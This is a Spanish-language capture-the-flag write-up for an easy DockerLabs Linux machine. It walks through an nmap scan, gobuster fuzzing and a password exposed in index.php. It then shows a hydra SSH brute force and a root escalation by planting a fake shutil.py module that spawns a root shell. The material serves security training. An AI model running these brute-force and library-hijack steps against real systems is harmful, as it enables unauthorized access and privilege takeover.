Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #ssh #brute-force #dockerlabs

![](../assets/Pasted image 20251103001202.png)
## Reconocimiento

Empezamos Listando los puertos abiertos TCP del objetivo:
```bash
> nmap -p- --open --min-rate 5000 172.17.0.2 -Pn -n 
------------------------------------------------------------------------------------------------------------------------------------------------
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-31 19:50 CST
Nmap scan report for 172.17.0.2
Host is up (0.00021s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Notamos 2 puertos abiertos y procedemos a lanzar un reconocimiento mas profundo sobre estos puertos
- `80` - Corre un servidor  Apache httpd 2.4.58 ((Ubuntu))
- `22` - Servicio SSH  OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
```bash
> nmap -p22,80 -sCV --min-rate 5000 -Pn -n -oN ports.txt 172.17.0.2
------------------------------------------------------------------------------------------------------------------------------------------------
Nmap scan report for 172.17.0.2
Host is up (0.00047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f9:f6:fc:f7:f8:4d:d4:74:51:4c:88:23:54:a0:b3:af (ECDSA)
|_  256 fd:5b:01:b6:d2:18:ae:a3:6f:26:b2:3c:00:e5:12:c1 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Puerto 80 HTTP**

- Es la web default de apache, lo cual no nos dice mucho
![](../assets/Pasted image 20251031194304.png)

## Enumeración

Realizamos Fuzzing  con `gobuster` sobre el servidor apache para encontrar recursos y archivos no visibles:
```bash
> gobuster dir -u http://172.17.0.2/ -w /home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt -x js,php,html,txt -t 20  
------------------------------------------------------------------------------------------------------------------------------------------------
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/index.php            (Status: 200) [Size: 26]
/index.html           (Status: 200) [Size: 10671]
/server-status        (Status: 403) [Size: 275]
```

- El resultado nos reporta un archivo llamado `index.php`

Dentro del archivo `index.php` pudimos encontrar una credencial:
_JIFGHDS87GYDFIGD_ Podemos intuir que esta es la credencial de acceso del servicio SSH
![](../assets/Pasted image 20251031192525.png)

## Explotación

Realizamos un ataque de fuerza bruta sobre el servicio SSH para descubrir el usuario al que pertenece la contraseña
- Se encuentra un usuario valido llamado _carlos_
```bash
> hydra -L /home/wndr/Tools/dictionaries/SecLists/Usernames/xato-net-10-million-usernames.txt -p "JIFGHDS87GYDFIGD" ssh://172.17.0.2 -t 4
------------------------------------------------------------------------
[22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD 

```


Accedemos al servicio SSH con el usuario _carlos_ 
![](../assets/Pasted image 20251031192744.png)


## Escalada de Privilegios

Ya conectado al SSH, buscamos binarios que se puedan ejecutar con permisos de administrador sin requerir de la contraseña
- Encontramos un script.py ejecutable sin necesidad de contraseña
```bash
carlos@786c84f45512:~$ sudo -l
----------------------------------------------------------------------------------------------------------------------------------
Matching Defaults entries for carlos on 786c84f45512:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User carlos may run the following commands on 786c84f45512:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

**Python Library Hijacking**
Inspeccionamos el _script.py_ y notamos que utiliza una librería llamada `shutil`

```python
> carlos@786c84f45512:~$ cat /opt/script.py
--------------------------------------------
import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f'Archivo copiado de {origen} a {destino}')

if __name__ == '__main__':
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)
```

Creamos un modulo con el mismo nombre `shutil.py`
```bash
> nano /opt/shutil.py
```

- Ejecutamos una bash como administrador
```python
import os

os.system("sudo /bin/bash")
```

Procedemos a ejecutar el `script.py` 

```bash
> carlos@786c84f45512:~$ sudo /usr/bin/python3 /opt/script.py
```

Ya somos root:
![](../assets/Pasted image 20251031194151.png)

